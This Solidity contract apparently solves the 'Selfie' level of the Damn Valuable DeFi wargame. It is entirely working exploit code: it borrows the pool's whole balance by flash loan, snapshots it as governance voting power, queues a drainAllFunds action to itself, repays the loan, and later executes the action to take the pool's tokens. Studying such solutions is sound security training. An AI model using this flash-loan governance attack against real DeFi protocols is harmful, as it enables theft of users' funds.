// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../selfie/SimpleGovernance.sol";
import "../selfie/SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

contract AttackSelfiePool {

  address selfiePool;
  address gov;
  address token;
  uint actionId;

  constructor(address _selfiePool, address _gov, address _token) {
    selfiePool = _selfiePool;
    gov = _gov;
    token = _token;
  }

  function attack() public {
    DamnValuableTokenSnapshot(token).snapshot();
    uint bal = DamnValuableTokenSnapshot(token).getBalanceAtLastSnapshot(selfiePool);
    SelfiePool(selfiePool).flashLoan(bal);
  }

  function receiveTokens(address _token, uint256 amount) public {
    DamnValuableTokenSnapshot(token).snapshot();
    bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", address(this));
    actionId = SimpleGovernance(gov).queueAction(selfiePool, data, 0);
    DamnValuableTokenSnapshot(token).transfer(msg.sender, amount);
  }

  function execute() public {
    SimpleGovernance(gov).executeAction(actionId);
    uint bal = DamnValuableTokenSnapshot(token).getBalanceAtLastSnapshot(address(this));
    DamnValuableTokenSnapshot(token).transfer(msg.sender, bal);
    DamnValuableTokenSnapshot(token).snapshot();
  }

}